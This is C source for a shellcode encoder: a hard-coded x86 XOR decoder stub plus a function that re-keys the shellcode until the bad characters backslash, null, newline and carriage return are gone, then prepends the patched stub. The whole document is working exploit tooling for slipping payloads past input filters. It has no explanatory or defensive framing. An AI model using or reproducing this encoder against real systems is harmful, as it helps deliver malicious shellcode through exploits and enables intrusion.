char encoder[] = "\xEB\x02\xEB\x05\xE8\xF9\xFF\xFF\xFF\x5B\x31\xC9\x66\xB9\xFF\xFF"
         "\x80\x73\x0E\xFF\x43\xE2\xF9";
#define ENCODER_OFFSET_SIZE 14 // Offset for size of the encoder
#define ENCODER_OFFSET_XORKEY 19 // Offset for the xor key

bool contains(char* szBuf, int iSize, char cChar) {
  for (int i = 0; i < iSize; i++) {if (szBuf[i] == cChar) {return true; } }
  return false; }

int encrypt_shellcode(char* szOrigShell, int iOrigShellSize, char* szShellBuf,
  int iShellBufSize, SCCallbackFunc pfnSC) {
  int iSCSize = iOrigShellSize, iEncoderSize = sizeof(encoder);
  int xorkey = 0x98;
  // Create local copies of the shellcode and encoder
  char* szShellCopy = (char*)malloc(iSCSize);
  memset(szShellCopy, 0, iSCSize);
  memcpy(szShellCopy, szOrigShell, iSCSize);
  char* szEncoderCopy = (char*)malloc(iEncoderSize);
  memset(szEncoderCopy, 0, iEncoderSize);
  memcpy(szEncoderCopy, encoder, iEncoderSize);
  if (pfnSC) {pfnSC(szShellCopy, iSCSize); }
  char* szShellBackup = (char*)malloc(iSCSize);
  memset(szShellBackup, 0, iSCSize);
  memcpy(szShellBackup, szShellCopy, iSCSize);

  // Set the content size in the encoder copy
  char* szShellLength = (char*)&iSCSize;
  szEncoderCopy[ENCODER_OFFSET_SIZE] = (char)szShellLength[0];
  szEncoderCopy[ENCODER_OFFSET_SIZE + 1] = (char)szShellLength[1];

  // XOR the shellcode while it contains 0x5C, 0x00, 0x0A or 0x0D
  while (contains(szShellCopy, iSCSize, '\x5C') || contains(szShellCopy, iSCSize, '\x00') ||
    contains(szShellCopy, iSCSize, '\x0A') || contains(szShellCopy, iSCSize, '\x0D')) {
    memcpy(szShellCopy, szShellBackup, iSCSize);
    xorkey++;
    for (int i = 0; i < iSCSize; i++) {szShellCopy[i] = szShellCopy[i] ^ xorkey; }
    szEncoderCopy[ENCODER_OFFSET_XORKEY] = xorkey;
  }
  free(szShellBackup);
  // Clear the buffer with '\x00'
  memset(szShellBuf, 0, iShellBufSize);
  int iPos = 0;
  // Append the encoder copy
  memcpy(szShellBuf + iPos, szEncoderCopy, iEncoderSize);
  iPos += iEncoderSize;
  // Append the shellcode copy
  memcpy(szShellBuf + iPos - 1, szShellCopy, iSCSize);
  iPos += iSCSize;
  free(szEncoderCopy);
  free(szShellCopy);
  return iPos;
}
